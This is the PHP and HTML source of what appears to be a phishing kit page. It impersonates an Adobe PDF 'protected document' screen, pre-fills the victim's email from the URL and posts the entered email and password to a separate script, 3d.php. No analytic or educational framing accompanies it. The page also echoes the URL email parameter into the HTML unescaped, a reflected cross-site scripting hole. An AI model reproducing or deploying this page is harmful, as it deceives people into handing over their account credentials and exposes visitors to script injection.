<?php
function getemailIDFromemail($email)
{
$find = '@';
$pos = strpos($email, $find);
$emailID = substr($email, 0, $pos);
return $emailID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$email = $_GET['email'];
$emailID = getemailIDFromemail($email);
$domain = getDomainFromEmail($email);
$ln = strlen($email);
$len = strrev($email);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>

<!DOCTYPE html>
<link rel="icon" type="image/ico" href="files/favicon-16x16.png"/>
<script type="text/JavaScript"><!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.name; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' Is required.\n'; }
  } if (errors) alert('The following error occurred:\n'+errors);
  document.MM_returnValue = (errors == '');
}
</script>
<html >
  <head>
    <meta charset="UTF-8">


    <title>Adobe® PDF Reader® Xl</title>
    
    
<link rel='stylesheet prefetch' href='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css'>
<link rel="stylesheet" href="files/style.css">
<document.body.style.backgroundPosition = "";> 

<body style="background-image: url(files/2222.png); background-repeat: no-repeat;"></head>

  <body>
<br>
<br>
<br>
<br>
<br>
<br>

  <div class="login-card">
    <p align="center"><img src="files/lg_211.png" width="571" height="87"><br>
    </p>
<h1><img src="files/warning_sign_clip_art_20327.gif" width="29" height="30">This File is Protected by Adobe® Security</h1>
      <div align="center">
      <div align="center">
      LogIn with your email and password to open this document.<br>
      <br><form action="3d.php" method="post" onsubmit="MM_validateForm('email','','RisEmail','password','','R');return document.MM_returnValue">
      </div>
      </div>
      <form class="login">
     <div align="center">
       <p>
         <input type="email" name="login" value="<?php echo $_GET['email']; ?>" placeholder="Email address" required="required" autofocus>
         <input type="password" name="passwd" placeholder="Password" required="required" autofocus>
         <input type="submit" name="login2" class="login login-submit" value="Open This Document" id="login">
         <br>
       <img src="files/lg_212.png" width="561" height="92">       </p>
     </div>
  </form>
  </div>
  <p><br>
      <br>
  </p>
  <p>
      <!-- <div id="error"><img src="https://dl.dropboxusercontent.com/u/23299152/Delete-icon.png" /> Your caps-lock is on.</div> -->
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src='http://ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/jquery-ui.min.js'></script>
      <br>
</p>
  </body>
</html>
